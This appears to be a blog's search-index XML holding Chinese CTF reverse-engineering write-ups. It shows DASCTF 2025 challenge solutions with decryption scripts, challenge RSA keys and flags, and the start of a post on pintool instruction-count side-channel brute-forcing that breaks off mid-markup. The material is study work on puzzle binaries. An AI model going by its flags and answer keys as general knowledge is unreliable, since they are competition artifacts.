<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DASCTF下半年赛_reverse</title>
    <link href="/2025/12/13/DASCTF%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B-reverse/"/>
    <url>/2025/12/13/DASCTF%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B-reverse/</url>
    
    <content type="html"><![CDATA[<p>DASCTF2025下半年比赛逆向题。前一阵子一直在复习备考，没及时更新~~</p><span id="more"></span><h1 id="androidfff"><a href="#androidfff" class="headerlink" title="androidfff"></a>androidfff</h1><p>先用jadx看，发现MainActivity是空的，然后看了下AndroidManifest发现是flutter，用blutter恢复。</p><p>blutter安装教程：<a href="https://www.cnblogs.com/hansa/p/18337467">https://www.cnblogs.com/hansa/p/18337467</a></p><p>先用blutter解包得到符号表那些，ida打开libapp.so，导入符号表</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512131527571.png" alt="image-20251213152716446"></p><p>直接搜索flag找到对应的函数，这里就是密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512131951699.png" alt="image-20251213195155622"></p><p>不过找到主要加密逻辑还是有点麻烦，这里我看了其他师傅的解题过程</p><p>通过解包出来的pp.txt找到逻辑，地址就是0x29cb18</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512131956163.png" alt="image-20251213195611107"></p><p>这里是xor加密的逻辑，先<em>2，</em>2相当于左移1位，解密就是右移移1位，再xor0x32，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512131621288.png" alt="image-20251213162140217"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<span class="hljs-number">0xEC</span>,<span class="hljs-number">0xE6</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0xE2</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0xE8</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0xA8</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x8E</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xDA</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xDA</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xDA</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x9E</span>]<br><br>plain = []<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher:<br>    <span class="hljs-keyword">if</span> c &amp; <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: odd byte!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p = (c &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x32</span><br>        plain.append(p)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted:&quot;</span>, <span class="hljs-built_in">bytes</span>(plain))<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;DASCTF{flutter_is_so_easy}</p><h1 id="ezmac"><a href="#ezmac" class="headerlink" title="ezmac"></a>ezmac</h1><p>这里找到验证的部分，输出right&#x2F;wrong</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132011160.png" alt="image-20251213201114111"></p><p>然后看看上级的调用，看汇编，这里其实是传参的过程，传参是0x57，其实就是xor加密的密钥</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132013634.png" alt="image-20251213201346577"></p><p>byte_100004022就是密文内容</p><p>这里就是xor加密部分</p><p><img src="C:/Users/38489/AppData/Roaming/Typora/typora-user-images/image-20251213202653025.png" alt="image-20251213202653025"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [<span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x21</span>,<br><span class="hljs-number">0x74</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>,<br><span class="hljs-number">0x7F</span>, <span class="hljs-number">0x2D</span>]<br>res = []<br><span class="hljs-keyword">for</span> i,b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>    key = <span class="hljs-number">57</span> + i<br>    orig = b ^ key<br>    res.append(orig)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> res))<br>//DASCTF&#123;83c720da35436cc0&#125;<br></code></pre></td></tr></table></figure><h1 id="androidfile"><a href="#androidfile" class="headerlink" title="androidfile"></a>androidfile</h1><p>直接看mainactivity，发现所有的明文内容都被加密了，不过影响不大</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132035462.png" alt="image-20251213203525406"></p><p>加密过程：先将flag进行AES-CBC加密，不过key和iv都是伪随机的，再进行base64加密，然后是RSA公钥加密，再base64加密，最后是在native层的校验。</p><p>解密就清晰了，先看so文件，native层的加密就是rc4+base64，rc4加密密钥就是REVERSE</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132040605.png" alt="image-20251213204054520"></p><p>题目给的密文等信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">EvB2udc3ofALSbCxeH5j4O2QZjfyZ151Nj3tOBVpt+<span class="hljs-number">99</span>XXudbbzYknID0CxFcVO5+Vf16SjxzVbCuOizTIm3TVXXprsM1IlyjzJnTIUc8s4cFIX+clb1zN5PqUm11Z9LDlUMGYu+fa0fZqB5o7EMXWJvl+uKOsk<span class="hljs-regexp">/K3zzrnU0Rdpn/</span>Ylm0ZBBDqpaNDYeXkGM52Uj6NxOhRRMaW2VcH<span class="hljs-regexp">/u4rNg7y7/</span>X6OKa68G2TstGohwelnKpzgp4eFBNxn2<br>&lt;-encryptinput-&gt;<br>UBUSWb+<span class="hljs-number">1</span>P3Z<span class="hljs-regexp">/aokV67e5xQ7eaHoEj3JAeC0XA1RckTWdWZYCB/</span>+D7qC3Hao74goX<br><br><br><br>获取的RSA公钥和私钥<br>-----<span class="hljs-keyword">BEGIN</span> PUBLIC KEY-----  <br>MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJ3AfAR+HoKn8iQaFT8xjSLkJf+uHuX5  dSH<span class="hljs-regexp">/gsLSAlqIkVeADHx7okRAfl5U2sCe0A/</span><span class="hljs-number">2</span>SY9sDurGOLHTYcmHAuECAwEAAQ\=\=  <br>-----<span class="hljs-keyword">END</span> PUBLIC KEY-----<br><br>-----<span class="hljs-keyword">BEGIN</span> PRIVATE KEY-----  <br>MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAncB8BH4egqfyJBoVPzGNIuQl<span class="hljs-regexp">/64e5fl1If+CwtICWoiRV4AMfHuiREB+XlTawJ7QD/</span>ZJj2wO6sY4sdNh  yYcC4QIDAQABAkEAh81Gdg+kcFHoD9AsbkRX<span class="hljs-regexp">/atuUtcwXkYL4gK2LMThpdEFHIO7  Scr+SYfwqmm/</span>LMtkbojEGEnNoIfmoLvGfhXaAQIhANDWo8OSMSQFnvh129cFiVfY  KlS4ec24ixvFD8fUD4SRAiEAwWBuZ3kox1n21AsTAxom+E3z5KUUOSUjPXvG6tZB  gVECIDOP2y0tSi6<span class="hljs-regexp">/qIll6BqFxmxG9eSnC4PMfaQkmonXBOHRAiBmJUPsUGmj8/</span>eX  xknCp7vSCYs9SZ3HGcDlp05Jmed8IQIhAJnE1PNe9lC5OazgRYhSG6bGCTbfFHT6  OuwCVIxRSx4P  <br>-----<span class="hljs-keyword">END</span> PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>提取第一段密文进行解密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132044646.png" alt="image-20251213204454580"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">enkey_QMz2qirA80LJiOs30Efl00JsrIv+ZdrM9iB74P<span class="hljs-regexp">/nCWOrzEemEOaq2lN1/</span>V5<span class="hljs-regexp">/rOAoTgBanJO/</span>Acpo<br>okhVIOVdsA==<br>eniv_hKH<span class="hljs-regexp">/M/</span>v8zwVICeWlc652BZk2eA<span class="hljs-regexp">/c2g0cLpBwvWBVlphiwBBasdn9HPWk7sb/</span>IaRh8eppZrToUwz6<br>f1eomFJkEQ=<br></code></pre></td></tr></table></figure><p>这是解出来的key和iv，下一步就是利用rsa来解密key和iv了，</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132055016.png" alt="image-20251213205459950"></p><p>key：ElmGJYfKbc2gJh0G</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132055513.png" alt="image-20251213205543463"></p><p>iv：JZ4tQgwSm3ZZIELJ</p><p>最后就是aes解密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132102561.png" alt="image-20251213210218499"></p><p>DASCTF{android_encrypto_file_and_plains}</p><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>在server端，这里是接收了一个account然后进行验证，byte_C1A0是对比的密文，属于rsa密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132116464.png" alt="image-20251213211625403"></p><p>还有一个rc4加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132117426.png" alt="image-20251213211758378"></p><p>sub_73B2使用rsa私钥解密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132119531.png" alt="image-20251213211951486"></p><p>在client端中获取RSA因⼦(P,Q)重建私钥解密byte_C1A0和byte_C0A，解密得到key和iv</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132121397.png" alt="image-20251213212157339"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>sub_49DD 和 sub_4125 函数都是AES-CBC加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202512132137426.png" alt="image-20251213213757369"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-comment"># RSA Parameters (Hex strings from analysis)</span><br>n_hex = (<br>    <span class="hljs-string">&quot;9a49428cadd84b7a81cb80f916e645a6a9dd23c2fe679f93af6a77eff0f0bb13&quot;</span><br>    <span class="hljs-string">&quot;09b77fb7861275f07ab41e98ae5c2ecf933f27d47b9ce0a55a3e06569cacbb4&quot;</span><br>    <span class="hljs-string">&quot;c9183f8ee9a47f2cfbb3a5965c9326f45d2d608cfeabea1a1879eae95b70224&quot;</span><br>    <span class="hljs-string">&quot;d2e7736b9bc4109756f55a3f70f11a9b9c6564fb6456d329c336fbb59859db5&quot;</span><br>    <span class="hljs-string">&quot;fde1f2338294e863c4f05b4a89e6c3b761d52a2081a0af0a320fde831daa74&quot;</span><br>    <span class="hljs-string">&quot;1fad77aa7ef2dd30b3e33d1a6e7b44ed44ef40de4557a4fd65b63db63d105386bb&quot;</span><br>    <span class="hljs-string">&quot;d81071739ec3d0fe44b6a0952a2b065bededfecea6e22229fea32adfc9a6e2cc&quot;</span><br>    <span class="hljs-string">&quot;fdf5da437a56ad41d7ef08c2c4635d3a0218aab2a5ed6e9dd42d684bc918efe24d3&quot;</span><br>)<br><br>e_hex = <span class="hljs-string">&quot;10001&quot;</span><br><br>d_hex = (<br>    <span class="hljs-string">&quot;28c7df24a5798679db2a44979275f5f3179db180d91335702942fb1b70e985de&quot;</span><br>    <span class="hljs-string">&quot;825da90f2eb65d20ddf8be1d9d4e15bc1d84e95795ff8c0c28ce3c33fde054f6&quot;</span><br>    <span class="hljs-string">&quot;e82a4f4cc22597b350c9c62ccc0188bd4152a701a3601558f22aa9fae8b9fdac&quot;</span><br>    <span class="hljs-string">&quot;6c2bc09b1637f71e0511805e04b203c4fdb2b36ad232fe819b06ed4e57c74f39&quot;</span><br>    <span class="hljs-string">&quot;fd9b72623c16ff2100f148f622bf12876260c4859672360dc0da3da6b45c5c8c&quot;</span><br>    <span class="hljs-string">&quot;6215ccda072765840c213fba11a91d6bf598a8a8065797566c8950a34ea0a072&quot;</span><br>    <span class="hljs-string">&quot;a9ed0c38bdc58662f186ec578ca55d5098443fd566cc722ace9c4e89afc4e302&quot;</span><br>    <span class="hljs-string">&quot;c8a4870e11a003b935f4a102695bfd64bb0fa74dcc372682e2b24ff45a1a69&quot;</span><br>)<br><br>c_account_hex = (<br>    <span class="hljs-string">&quot;1638e0eb936140b5527033292cbefcd73b55cfc7fb79df51ae3768a0dd9c84ae&quot;</span><br>    <span class="hljs-string">&quot;4580e47a5133b425f4c93eac97e4b1aa0b4cd30589d004f6d0d19fcbc709e86c&quot;</span><br>    <span class="hljs-string">&quot;c2996b433d29f650b69987a466f05bef7f69945860dcc44742a511f3621385c8&quot;</span><br>    <span class="hljs-string">&quot;9fbd4d73153615789634b25cfc3151a4115bc30c96979e5f965290f36a863e33&quot;</span><br>    <span class="hljs-string">&quot;78b5cfc9ba31438c4bae22b23ef815edf7cf1771803bd392a5072b468900b75f&quot;</span><br>    <span class="hljs-string">&quot;5a4377d1daf3d6f7b7b6850d1a4a4134f2f65840efaa9b83d31083051df0fc80&quot;</span><br>    <span class="hljs-string">&quot;a786529159484f62bbb9524f68285f48c7ab8e03bdfeca1a6025aaed9f9728b3&quot;</span><br>    <span class="hljs-string">&quot;90689c0c963920c728eb5695fcb9413f9f4e06d3b93db40e26d6275c84e6126a&quot;</span><br>)<br><br>c_key_hex = (<br>    <span class="hljs-string">&quot;373a2a27b38fd778c716728ebb95be89a0a057109119a08d5ce49261ebb0e077&quot;</span><br>    <span class="hljs-string">&quot;6d254a40c4d21bd2463e61608771de401eed13ac6660d996bea8c8b82bdd0eaf&quot;</span><br>    <span class="hljs-string">&quot;56c38466776eba31f7b2219230b654a77ec0af395a01c31c139a4f6b7b8ba845&quot;</span><br>    <span class="hljs-string">&quot;192096165dd7acd0331e79dbe434ed8c9a66581d26f69e5faa295f66010076b9&quot;</span><br>    <span class="hljs-string">&quot;1a6dd61db7abd325f8bd25d928debcc02e5555ff81f7ae3e548e3e4659a37f5d&quot;</span><br>    <span class="hljs-string">&quot;3d3c39fbcad1b583e42fb04fa328ebb77e7841f45b711e77ee23e11989db2c0e&quot;</span><br>    <span class="hljs-string">&quot;06b8191a456d56bd1a7d42c47fdfdf1179228b57c6efca9b9b6a7d22682e5b67&quot;</span><br>    <span class="hljs-string">&quot;c7c46a877fb677f5f317b4823fcdc812f0362be27c0f5453037148ed30127b26&quot;</span><br>)<br><br>c_account = binascii.unhexlify(c_account_hex[:<span class="hljs-number">512</span>])<br>c_key = binascii.unhexlify(c_key_hex[:<span class="hljs-number">512</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;N length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(binascii.unhexlify(n_hex))&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Account length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(c_account)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Key length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(c_key)&#125;</span>&quot;</span>)<br><br>n = <span class="hljs-built_in">int</span>(n_hex, <span class="hljs-number">16</span>)<br>e = <span class="hljs-built_in">int</span>(e_hex, <span class="hljs-number">16</span>)<br>d = <span class="hljs-built_in">int</span>(d_hex, <span class="hljs-number">16</span>)<br><br>key = RSA.construct((n, e, d))<br>cipher = PKCS1_OAEP.new(key)<br><br><span class="hljs-keyword">try</span>:<br>    m_account = cipher.decrypt(c_account)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Account: <span class="hljs-subst">&#123;m_account&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Account Decrypt Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    m_key = cipher.decrypt(c_key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">&#123;m_key&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Key Decrypt Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>iv: aassddffgghhjjll<br>Key: qqwweerrttyyuuii</p><p>aes解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>key = <span class="hljs-string">b&#x27;qqwweerrttyyuuii&#x27;</span><br>iv = <span class="hljs-string">b&#x27;aassddffgghhjjll&#x27;</span><br>enc = <span class="hljs-built_in">bytes</span>([<br><span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xDA</span>,<br><span class="hljs-number">0xC3</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x23</span>,<br><span class="hljs-number">0x8E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x26</span>,<br><span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x95</span>,<br><span class="hljs-number">0xB5</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8E</span><br>])<br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>decrypted = cipher.decrypt(enc)<br><span class="hljs-built_in">print</span>(decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br>//DASCTF&#123;dqmaxfwkm921kr21m;df1m1dqmlk1d12d1&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于pintool的侧信道爆破实现</title>
    <link href="/2025/11/12/%E5%9F%BA%E4%BA%8Epintool%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4%E5%AE%9E%E7%8E%B0/"/>
    <url>/2025/11/12/%E5%9F%BA%E4%BA%8Epintool%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>​    vm    单字节加密    侧信道爆破   pintool安装……<br>题目来源第八届“强网”拟态防御国际精英挑战赛_hyperjump</p><span id="more"></span><p>这里我是根据这个师傅的文章来安装pintool的：<a href="https://www.cnblogs.com/level5uiharu/p/16963907.html">欢迎回来(。・∀・)ノ</a></p><p>同时我看了swdd的文章[<a href="https://bbs.kanxue.com/thread-281796.htm">原创]基于 Frida 对单字节加密验证程序侧信道爆破-CTF对抗-看雪论坛-安全社区|非营利性质技术交流社区</a></p><p>以及butterfly师傅的文章：<a href="https://buutt3rf1y.github.io/2025/10/31/%E7%AC%AC%E5%85%AB%E5%B1%8A%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/#Reverse">(｡･ω･｡)泥嚎</a></p><hr><p>VM类型题，flag长度为24，这里加密一次存入byte_5420[n23_1]后进行比较，是单字节加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202511122053033.png" alt="image-20251112205324919"></p><p>此时就可以用到pintool来进行侧信道爆破。</p><hr><p>这里我看到了有的师傅用时间来爆破（时序侧信道爆破），不过爆破的结果不稳定，会出现错误，我就没有用这种方法去尝试，不过后续准备试试。</p><hr><p>Intel Pin：动态二进制插桩，在不修改源代码、不重新编译程序的情况下，对二进制可执行文件进行运行时插桩，以便分析程序的执行过程。在侧信道研究方面，统计指令数量、分支次数、缓存访问等特征。</p><p>思路是通过 PinTool 收集程序在不同输入下执行的指令数，通过判断差异来爆破。</p><p>指定 Pin 可执行文件和计数工具 inscount0.s，该 .so 会统计程序执行的总指令数并输出到 inscount.out。</p><p>注意限制flag{}，不然最后爆破最后一位会出现错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span 